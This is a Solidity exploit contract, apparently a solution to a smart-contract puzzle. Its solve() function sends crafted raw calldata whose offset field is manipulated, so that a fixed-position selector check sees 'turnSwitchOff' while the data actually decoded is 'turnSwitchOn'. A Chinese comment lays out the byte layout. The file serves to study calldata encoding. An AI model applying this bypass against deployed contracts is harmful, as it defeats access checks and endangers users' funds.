// SPDX-License-Identifier: MIT
pragma solidity >0.8.4;
contract Hack{
    address public target;
    // bytes4 public test;
    bool public  success=false;
    constructor(address add) payable {
        target=add;
    }
    function solve()public {
        bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";

        (success, ) = target.call(data);
        // test = abi.decode(data, (bytes));
        // test = bytes4(keccak256("turnSwitchOn()"));
    }
}
/*
考察calldata的encode方式
calldata传参为bytes，格式为bytes4(selector) + offset(data) + len(data) + data，要求calldata[68:68+4] == bytes4(trunswitchoff)
构造calldata为bytes4(selector)+bytes32(0x60) +padding        +bytes4(trunswitchoff)+ bytes32(4) + bytes4(trunswitchon)
             |offset:0-4      |offset:4-4+32 |offset:36-36+32|offset:68-68+4        |offset72:
 */